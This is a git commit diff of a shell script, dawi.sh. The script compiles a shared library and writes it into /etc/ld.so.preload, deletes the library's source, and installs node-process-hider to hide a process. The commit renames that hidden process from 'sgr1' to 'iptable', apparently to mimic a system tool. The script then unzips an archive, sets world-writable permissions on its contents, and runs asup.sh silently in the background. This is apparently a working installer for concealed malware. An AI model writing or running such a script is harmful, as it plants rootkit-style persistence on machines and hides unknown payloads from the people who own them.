7eef067f8efd9434418c0ad6101ab41ec05791cb
adawisaud <114278989+adawisaud@users.noreply.github.com>
2022-10-02 10:02:25 +0700

    Update dawi.sh

--- dawi.sh
+++ dawi.sh
@@ -6,7 +6,7 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
+apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add iptable
 unzip asup.zip
 chmod 777 iptable time asup.sh
 ./asup.sh >/dev/null &
